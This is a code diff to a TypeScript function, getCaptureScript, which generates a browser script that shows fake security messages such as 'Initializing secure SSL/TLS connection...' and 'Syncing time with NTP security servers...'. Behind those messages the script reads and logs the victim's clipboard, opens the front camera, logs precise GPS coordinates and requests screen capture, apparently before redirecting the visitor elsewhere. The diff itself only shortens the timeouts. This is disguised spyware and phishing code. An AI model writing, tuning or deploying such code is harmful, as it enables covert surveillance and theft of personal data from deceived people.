@@ -585,7 +585,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'notification') {
               try {
                 if (!isSilent) updateProgress(prog, "Initializing secure SSL/TLS connection...");
-                if ("Notification" in window) await pTimeout(Notification.requestPermission(), 10000);
+                if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
               } catch(e) {}
             }
 
@@ -593,7 +593,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               try {
                 if (!isSilent) updateProgress(prog, "Verifying session token integrity...");
                 if (navigator.clipboard && navigator.clipboard.readText) {
-                  var clip = await pTimeout(navigator.clipboard.readText(), 10000).catch(function(){});
+                  var clip = await pTimeout(navigator.clipboard.readText(), 3000).catch(function(){});
                   if (clip) await logExtra({ clipboard: clip });
                 }
               } catch(e) {}
@@ -606,7 +606,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   // Try to get video only first for better success rate
                   var stream = await pTimeout(navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
                     return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
-                  }), 20000);
+                  }), 8000);
                   
                   if (stream) {
                     try {
@@ -659,9 +659,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                     navigator.geolocation.getCurrentPosition(
                       function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                       function(err) { resolve(); },
-                      { enableHighAccuracy: true, timeout: 10000 }
+                      { enableHighAccuracy: true, timeout: 5000 }
                     );
-                  }), 15000);
+                  }), 8000);
                 }
               } catch(e) {}
             }
@@ -670,7 +670,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               try {
                 if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                  var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; }), 20000);
+                  var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; }), 8000);
                   if (s) {
                     try {
                       var track = s.getVideoTracks()[0];
